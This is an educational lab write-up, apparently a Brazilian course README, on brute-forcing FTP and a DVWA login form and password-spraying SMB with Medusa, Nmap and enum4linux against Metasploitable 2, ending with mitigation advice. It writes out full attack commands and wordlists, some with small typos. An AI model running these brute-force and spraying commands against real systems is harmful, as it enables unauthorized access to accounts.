# Projeto: Ataques de Força Bruta com Kali Linux e Medusa

## 🧩 Descrição Geral

Este projeto foi desenvolvido como parte do desafio da DIO, com o objetivo de explorar ataques de força bruta utilizando Kali Linux, Medusa e ambientes vulneráveis como Metasploitable 2 e DVWA. O foco é **encontrar e entender vulnerabilidades**, **executar testes num ambiente controlado** e **propor medidas de mitigação** baseado no que foi encontrado durante os testes.

O laboratório foi realizado em um ambiente local **Kali Linux** e Virtualbox executando a m´quina invadida, **Metasploitable 2**.

---

## 📌 Estrutura do Projeto

* `README.md` – Documentação completa do projeto
* `/testes_kali` – Diretório contendo diretórios dos testes
  - `/Testes_Medusa_Forms_Web` -  Diretório contendo os arquivos gerados previamente e durante a invasão do fumulário web [DVWA]
  - `/Testes_Medusa_Spray` - Diretório contendo os arquivos gerados previamente e durante a invasão usando spray

---

## 🖥️ 1. Configuração do Ambiente

### 🔶 Máquinas Utilizadas

* **Kali Linux** – Máquina atacante[Local]
* **Metasploitable 2** – Máquina vulnerável com múltiplos serviços[Máquina Virtual]
* **DVWA (Damn Vulnerable Web Application)** dentro do Metasploitable 2

### 🔧 Configuração da Rede

Ambas as máquinas foram configuradas com:

* Rede **Host-Only** no VirtualBox
* Verificação dos IPs via:

  ```bash
  ip a
  ```
  ou
  ```bash
  ifconfig
  ```

Exemplo de IPs no ambiente:

* Kali: `192.168.56.1`
* Metasploitable: `192.168.56.101`

---

## 🔐 2. Ataque de Força Bruta com Medusa em FTP

### 🔎 Descoberta do Serviço com Nmap

```bash
nmap -sV -p 21,22,80,445,139 192.168.56.101
```

Serviços encontrados (via Nmap):

**FTP (vsftpd 2.3.4) — Porta 21**

**SSH (OpenSSH 4.7p1) — Porta 22**

**HTTP (Apache 2.2.8) — Porta 80**

**Samba SMB — Portas 139 e 445**

### 🚀 Execução do Ataque

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt _m ftp -t 6           
```

### 🎯 Filtrando apenas as tentativas com SUCCESS

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt _m ftp -t 6 | grep SUCCESS
```

### ✔️ Resultado

Medusa retorna “SUCCESS” ao identificar a senha correta, por isso acabei por filtrar usando o 
```bash
grep
```
para melhor vizualizar os resultados.

---

## 🌐 3. Automação de Força Bruta em Formulários Web (DVWA)

### 🔧 Acesso ao DVWA

URL padrão no Metasploitable 2:

```
http://192.168.56.101/dvwa
```

Configure o DVWA Security Level para **LOW**.

### 🧨 Ataque com Medusa em Formulário Web

Exemplo:

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http -t 6 \
 -m PAGE: '/dvwa/login.php' \
 -m FORM: 'username:^USER^&password=^PASS^&Login=^Login' \
 -m 'FAIL=Login failed'
```

### 📌 Campos principais:

* **PAGE:** caminho para a páginba
* **FORM**: método HTTP
* **username/password**: parâmetros capturados pelo inspetor do navegador
* **FAIL=Login failed**: string que indica falha

---

## 📁 4. Password Spraying em SMB com Enumeração de Usuários

### 🔎 Enumeração com enum4linux

```bash
enum4linux -a 192.168.56.101 | tee enum4_output.txt
```

### 👤 Usuários encontrados

Os usuários encontrados foram posteriormente escritos manualmente por mim em um arquivo chamado **sub_users.txt**.

```
games
nobody
bind
proxy
syslog
ser
www-data
root
news
postgres
bin
mail
distccd
proftpd
dhcp
daemon
sshd
man
lp
mysql
gnats
libuuid
backup
sfadmin
elnetd
sys
klog
postfix
service
list
irc
ftp
tomcat55
sync
uucp
msfadmin

```

### 🎯 Password Spraying com Medusa

```bash
medusa -h 192.168.56.101 -U sub_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50 | grep -i "ACCOUNT FOUND"
```

---

## 🧪 5. Criação de Wordlists Simples

Além da wordlist contendo ops usuáruios encontrados, foi criada uma woprdlist conterndo possíveis senhas, abaixo o comando de criação do arquivo 
de lista de usuários e de senhas.
```bash
echo -e "games\nnobody\nbind\nproxy\nsyslog\nser\nwww-data\nroot\nnews\npostgres\nbin\nmail\ndistccd\nproftpd\ndhcp\ndaemon\nsshd\nman\nlp\nmysql\ngnats\nlibuuid\nbackup\nsfadmin\nelnetd\nsys\nklog\npostfix\nservice\nlist\nirc\nftp\ntomcat55\nsync\nuucp" > sub_users.txt
```
```bash
echo -e "123456\npassword\nqwerty\nmsfadmin\nwelcome\nWelcome123\nmsfadmin" > senhas_spray.txt
```

---

## 🛡️ 6. Recomendações de Mitigação

### 🔒 Medidas aplicáveis:

* Criar **políticas de senhas fortes**
* Implantar **limite de tentativas de login**
* Habilitar **fail2ban** para serviços expostos
* Usar **autenticação multifator (MFA)**
* Monitorar logs em `/var/log/auth.log` e `/var/log/vsftpd.log`
* Desabilitar serviços não utilizados

---

## 📚 7. Lições Aprendidas

Durante o desenvolvimento deste projeto, foi possível:

* Entender como ocorrem ataques de força bruta em diferentes cenários
* Utilizar ferramentas essenciais de auditoria como Medusa, Nmap e enum4linux
* Reconhecer a importância de políticas de segurança básicas
* Aprender a documentar e organizar um repositório técnico

---

## 🏁 Conclusão

Este desafio proporciona uma visão clara de como ataques simples podem comprometer sistemas desprotegidos. A prática possibilita não somente entender o ataque, mas também refletir sobre como evitá-los na vida real.

---

## 📎 Créditos e Referências

* DIO - Aulas e orientações
* Kali Linux – Documentação
* DVWA – Documentação oficial
* Medusa – Manual de uso
* Nmap – Referência completa

---

**Projeto desenvolvido para fins educacionais em ambiente controlado.**
